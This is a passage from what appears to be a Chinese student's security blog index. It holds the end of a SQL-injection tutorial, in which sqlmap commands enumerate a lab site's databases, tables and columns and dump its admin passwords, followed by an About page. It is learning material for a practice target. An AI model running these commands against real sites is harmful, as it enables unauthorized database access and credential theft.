实在没办法我就把hellohack拿去提交，结果就正确了（雾）。 ​ ","date":"2023-10-09","objectID":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/:4:1","series":null,"tags":["SQL注入漏洞",""],"title":"SQL注入快速入门—联合注入","uri":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/#手工注入"},{"categories":["Web安全"],"content":" 使用工具sqlmap注入：首先还是得先找到地址栏（URL）类似为：http://xxxxxxx?id=数字的页面 点击查看新闻的按钮 点完之后的URL为：http://pu2lh35s.ia.aqlab.cn/?id=1,符合要求 打开sqlmap，输入： python sqlmap.py -u \"http://pu2lh35s.ia.aqlab.cn/?id=1\" --dbs 这一步是扫出网站数据库名 结果如下： 从sqlmap扫到的数据库名来看我们得到了三个数据库名： information_schema maoshe test 文章开头提到的，在 MySQL5.0 版本后，MySQL 默认在数据库中存放一个information_schema的数据库 test数据库是MySQL系统默认安装时自带的一个数据库名，它通常用于进行测试和示例目的，而不是用于实际的生产环境 于是我们得到了网站的数据库名为： maoshe 与之前手工注入的结果一样 接下来要去扫maoshe数据库下的表名，输入： python sqlmap.py -u \"http://pu2lh35s.ia.aqlab.cn/?id=1\" -D maoshe --tables 结果如下： 从sqlmap扫到的数据库名来看我们得到了四个数据表名： admin dirs news xss 接下来是查询admin表下有哪些字段名，输入： python sqlmap.py -u \"http://pu2lh35s.ia.aqlab.cn/?id=1\" -D maoshe -T admin --columns 结果如下： 从sqlmap扫到的字段(列)名来看我们得到了四个字段名： Id username password 接下来是查询password字段里存放的数据，输入： python sqlmap.py -u \"http://pu2lh35s.ia.aqlab.cn/?id=1\" -D maoshe -T admin -C password --dump 结果如下： sqlmap扫到password字段里存放的数据为： hellohack zkaqbanban ​ ​ 参考文章： http://t.csdn.cn/3SJAU https://zhuanlan.zhihu.com/p/397815893 http://t.csdn.cn/DTTTa ","date":"2023-10-09","objectID":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/:4:2","series":null,"tags":["SQL注入漏洞",""],"title":"SQL注入快速入门—联合注入","uri":"/sql%E6%B3%A8%E5%85%A5%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/#使用工具sqlmap注入"},{"categories":null,"content":" 斯是陋室，惟吾德馨 ​ ","date":"0001-01-01","objectID":"/about/:0:0","series":null,"tags":null,"title":"关于","uri":"/about/#"},{"categories":null,"content":" 为何建此博客？22年刚踏入网安领域，为了能促使我在学习路上保持记笔记的习惯、备份本地的笔记以及了解网站的搭建流程，故建此博客。 此博客作为我的笔记备份站，初期文章内容比较随便，若能有一篇文章帮到你，我想它已经物超所值了。随着技术的提高，相信我可以写出更好的文章。 ​ 博客总体设计更偏向电脑端，建议用电脑访问 博客一开始是基于WordPress搭建的，后又转到Hugo，大爱Hugo！ ​ ","date":"0001-01-01","objectID":"/about/:1:0","series":null,"tags":null,"title":"关于","uri":"/about/#为何建此博客"},{"categories":null,"content":" 关于我网安大二，喜欢学技术，喜欢和志同道合的人交往，多多指教！ ","date":"0001-01-01","objectID":"/about/:2:0","series":null,"tags":null,"title":"关于","uri":"/about/#关于我"}]